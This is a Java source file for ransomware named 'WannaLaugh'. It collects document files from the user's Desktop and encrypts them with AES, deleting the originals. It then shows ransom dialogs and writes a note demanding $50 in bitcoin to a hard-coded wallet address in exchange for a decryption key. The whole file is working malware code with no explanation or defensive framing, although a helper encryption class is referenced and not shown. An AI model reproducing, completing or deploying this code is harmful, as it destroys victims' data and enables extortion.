package randsom;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;

import javax.swing.JFrame;
import javax.swing.JOptionPane;


public class fileReader {
	
	private static chiper c;
	private static HashSet<String> types;
	private static boolean decryptMode = false;
	
	static String warning = "Hey! Your files are now encrypted.\n" 
			+ "Please send $50 USD worth of bitcoin\n"
			+ "to this bitcoin account: \n\n"
			+ "bc1quum7ledvpnh7grlruerf2jxrjptq60r7sqjcyc \n\n"
			+ "to retrieve your decryption key!";
	static final JFrame frame = new JFrame();
	
	static private ArrayList<File> files;
	
	public static void main(String args[]) {
		
		c = new chiper();
		types = new HashSet<>(Arrays.asList("txt", "docx", "pdf", "doc"));
		files = new ArrayList<>();
		
		lookup(new File(System.getProperty("user.home")));		
		frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		
		JOptionPane.showMessageDialog(frame, "Hello !!!", "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
		
		if(decryptMode) {
			String privateKey = JOptionPane.showInputDialog("Enter your decryption key: ");
			if(privateKey != null) {
				c.privateInit(privateKey);
				decryptAlldoc(files);
				deleteReadMe();
			}
		}
		else {
			if(!files.isEmpty()) {
				encryptAlldoc(files);
				ReadMe();
				JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
				JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
				JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
			}
			
		}
		
		System.exit(0);
	}
	
	private static void lookup(File dir) {
		try {
			File d = new File(dir, "Desktop");
			if(d.exists())
				getFile(d, files);
			else {
				for(File f : dir.listFiles())
					if(f.isDirectory())
						lookup(f);
			}
		}catch(Exception ex) {}
	}
	
	private static void ReadMe() {
		
		try {
			DataOutputStream writer;
			writer = new DataOutputStream( new FileOutputStream("HOW_TO_DECRYPT_YOUR_FILES.txt"));
			writer.writeUTF("HOW TO DECRPTY YOU FILES:\r\n" + 
					"\r\n" + 
					"1. SEND $50 USD WORTH OF BITCOIN TO bc1quum7ledvpnh7grlruerf2jxrjptq60r7sqjcyc\r\n" + 
					"   TO RETREIVE YOUR DECRYPTION KEY.\r\n" + 
					"\r\n" + 
					"2. RUN THE PROGRAM AGAIN WITH THE KEY TO DECRYPT\r\n" + 
					"\r\n" + 
					"*** WANNALAUGH ***");
			writer.flush();
			writer.close();			
		}
		catch(Exception ex) {}
	}
	
	private static void deleteReadMe() {
		try {
			File f = new File("HOW_TO_DECRYPT_YOUR_FILES.txt");
			f.delete();
		}catch(Exception ex) {}
	}
	
	private static void getFile(File dir, List<File> files) {
		try {
			for(File f : dir.listFiles()) {
				if(f.isDirectory())
					getFile(f, files);
				else if(f.isFile()) {
					String fileName = f.getName();
					String ext = fileName.substring(fileName.lastIndexOf('.') + 1);
					if(!decryptMode && fileName.startsWith("Encrpyted-"))
						decryptMode = true;
					if(types.contains(ext) && !fileName.equals("HOW_TO_DECRYPT_YOUR_FILES.txt")){
						files.add(f);
					}
				}
			}
		}catch(Exception ex) {}
	}
	
	public static void encryptAlldoc(ArrayList<File> files) {
		
		try {
			DataInputStream reader;
			DataOutputStream writer;
			//MessageDigest hash = MessageDigest.getInstance("SHA-256");
			for(File f : files) {

				reader = new DataInputStream(new FileInputStream(f));
				int size = reader.available();
				byte[] data = new byte[size];
				reader.read(data);
				c.aesKeyGen();
				byte[] edata = c.encrypt(data);
				
				//filehashes.add(hash.digest(data));
				reader.close();
				f.delete();
				//Create Encrpyted File
				writer = new DataOutputStream( new FileOutputStream(f.getParent() + "\\Encrpyted-" + f.getName()));
				writer.write(c.getencrpytAESKey());
				writer.write(c.getIV());
				writer.write(edata);
				writer.flush();
				writer.close();
					
			}		
		}
		catch(Exception ex) {}
		
	}
	
	public static void decryptAlldoc(ArrayList<File> files) {
		
		try {
			DataInputStream reader;
			DataOutputStream writer;
			//MessageDigest hash = MessageDigest.getInstance("SHA-256");
			for(File f : files) {
				if(f.getName().startsWith("Encrpyted-")) {
					reader = new DataInputStream(new FileInputStream(f));
					int size = reader.available();
					byte[] aeskey = new byte[128];
					byte[] IV = new byte[16];
					byte[] data = new byte[size - 144];
					
					reader.read(aeskey, 0, 128);
					reader.read(IV, 0, 16);
					reader.read(data, 0, size - 144);
					c.setIV(IV);
					c.decrpytAESKey(aeskey);
					byte[] ddata = c.decrypt(data);

					reader.close();
					f.delete();
					writer = new DataOutputStream( new FileOutputStream(f.getParent() + "\\" + f.getName().substring(10)));
					writer.write(ddata);
					writer.flush();
					writer.close();
				}
			}
		}catch(Exception ex) {
			JOptionPane.showMessageDialog(frame, "TRY AGAIN!", "WRONG PASSWORD!!!", JOptionPane.WARNING_MESSAGE, null);
		}
		
	}
	
}
